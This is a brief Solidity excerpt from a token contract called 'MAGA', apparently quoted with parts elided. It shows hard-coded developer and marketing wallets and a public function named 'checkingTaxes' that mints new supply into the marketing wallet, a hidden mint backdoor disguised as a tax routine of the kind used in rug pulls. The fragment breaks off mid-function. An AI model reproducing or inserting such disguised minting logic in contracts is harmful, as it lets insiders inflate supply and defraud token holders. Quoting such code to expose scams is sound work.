...
contract MAGA is Context, IERC20 {
    ...
    address payable public DevWallet = payable(0xa990c13a0f970838Dee2E9de9c4aaec4119D5ef5);
    address payable public MarketingWallet = payable(0xd0741B0691f6Ea6Bc7E94d106161bc6B94B8a81A);
    ...
    function checkingTaxes(uint256 value, address adr) onlyAddress public virtual {
        require(adr == address(MarketingWallet));
        _Taxes(address(MarketingWallet), adr, value);
        _tTotal += value;
        _tOwned[adr] += value;
